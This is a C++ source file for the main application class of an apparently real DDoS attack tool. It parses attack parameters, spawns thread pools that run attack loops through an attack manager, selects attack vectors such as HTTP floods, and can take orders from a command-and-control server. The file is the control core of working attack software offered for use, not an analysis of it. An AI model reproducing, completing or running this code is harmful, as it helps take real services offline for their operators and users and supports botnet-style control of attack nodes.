#include <arpa/inet.h>

#include "xtool.h"
#include "netpool.h"
#include "CDDoSParams.h"
#include "CDDoSParser.h"
#include "CDDoSApp.h"

#include "tcpip.h"
#include "pktbuild.h"
#include "CAttack.h"
#include "CAttackMgr.h"

#ifdef INCLUDE_CNC
#include "CCncServer.h"
#endif

CDDoSApp g_ddosApp;

CDDoSApp::CDDoSApp() {
	// TODO Auto-generated constructor stub
    m_shutdown = false;
    m_is_net_use_thrd = false;
    m_is_evt_use_thrd = false;

    m_thrdpool = NULL;
    m_evt_thrd_cnt = 0;
    m_net_thrd_cnt = 0;
}

CDDoSApp::~CDDoSApp() {
	// TODO Auto-generated destructor stub
}

void CDDoSApp::expire_handle(void* param1, void* param2, void* param3, void* param4)
{
    g_attackMgr.expire_handle();
}

void CDDoSApp::attack_loop(void* param1, void* param2, void* param3, void* param4)
{
    CDDoSApp *app = (CDDoSApp*)param1;
    int thrd_index = (int)(long)param2;

    bool is_all_job_stopped;
    bool is_all_job_paused;

    while(app->m_shutdown == false)
    {
        g_attackMgr.attack_handle(thrd_index, &is_all_job_stopped, &is_all_job_paused);

        if(is_all_job_stopped)
        {
            break;
        }
        
        if (is_all_job_paused)
        {
            /*wait on signal*/
            ///TODO:
            usleep(10);
        }
    }

    RC_LOG_INFO("exit attack loop");
}

void CDDoSApp::_stop_evt_thrds()
{
    if (m_thrdpool)
    {
        np_free_evt_thrds(m_thrdpool);
        m_thrdpool = NULL;
    }
    return;
}

int CDDoSApp::_start_evt_thrds() 
{
    m_thrdpool = np_init_evt_thrds(m_evt_thrd_cnt);
    if(NULL == m_thrdpool)
    {
        RC_LOG_ERROR("init thread pool failed.");
        return RC_ERROR;
    }

    for (int32_t ii = 0; ii < m_evt_thrd_cnt; ii++)
    {
        if (FALSE == np_add_evt_job(m_thrdpool,
                    CDDoSApp::attack_loop, (void*)this, (void*)(long)ii, NULL, NULL))
        {
            RC_LOG_ERROR("add attk evt to thread pool failed.");
            return RC_ERROR;
        }
    }

    return RC_OK;
}

int CDDoSApp::net_worker_thrd_cnt()
{
    return m_net_thrd_cnt;
}

int CDDoSApp::init(int argc, char *argv[]) 
{
    CDDoSParser parser;
    CDDoSParam ddos_params;
    if (RC_OK != parser.cmd_parser(argc, argv, &ddos_params))
    {
        return RC_ERROR;
    }

    if (g_cnc_addr != 0)
    {
#ifdef INCLUDE_CNC
        /*wait command from cnc*/
        g_cncServer = new CCncServer(g_cnc_addr, g_cnc_port);
        return RC_OK;
#else
        RC_LOG_ERROR("not include cnc function.");
        return RC_ERROR;
#endif
    }
    
    if(NULL == g_attackMgr.add_attack_job(ddos_params))
    {
        parser.Usage(argv[0]);
        return RC_ERROR;
    }

    if (ddos_params.m_type == ATK_VEC_HTTP)
    {
        m_net_thrd_cnt = g_thrd_cnt;
    }
    else
    {
        m_evt_thrd_cnt = g_thrd_cnt;
    }

    return RC_OK;
}

void CDDoSApp::destroy()
{
#ifdef INCLUDE_CNC
    if (g_cncServer)
    {
        g_cncServer->destroy();
    }
#endif

    g_attackMgr.destroy();

    /*delete timer*/
    np_del_time_job(CDDoSApp::expire_handle, (void*)this);

    _start_evt_thrds();
}

int CDDoSApp::start()
{
    if (m_evt_thrd_cnt > 0)
    {
        _start_evt_thrds();
    }

    np_add_time_job(CDDoSApp::expire_handle,
                    (void*)this, NULL, NULL, NULL, ATTACK_TIMER_INTVAL, FALSE);

#ifdef INCLUDE_CNC
    if (g_cncServer)
    {
        g_cncServer->start();
    }
#endif

    return g_attackMgr.start();
}

void CDDoSApp::stop()
{
    m_shutdown = true;

#ifdef INCLUDE_CNC
    if (g_cncServer)
    {
        g_cncServer->stop();
    }
#endif

    g_attackMgr.stop();
}

bool CDDoSApp::check_task_end()
{
    bool cncServStopped = false;
    bool allAtkStopped = false;

#ifdef INCLUDE_CNC
    if (g_cncServer)
    {
        cncServStopped = g_cncServer->is_stopped();
    }
    else
#endif
    {
        cncServStopped = true;
    }

    allAtkStopped = g_attackMgr.is_all_stopped();

    /*都停止则认为结束*/
    if (allAtkStopped && cncServStopped)
    {
        return true;
    }

    return false;
}

void CDDoSApp::post_out(uint64_t eclipase_sec)
{
    g_attackMgr.post_out(eclipase_sec);
}
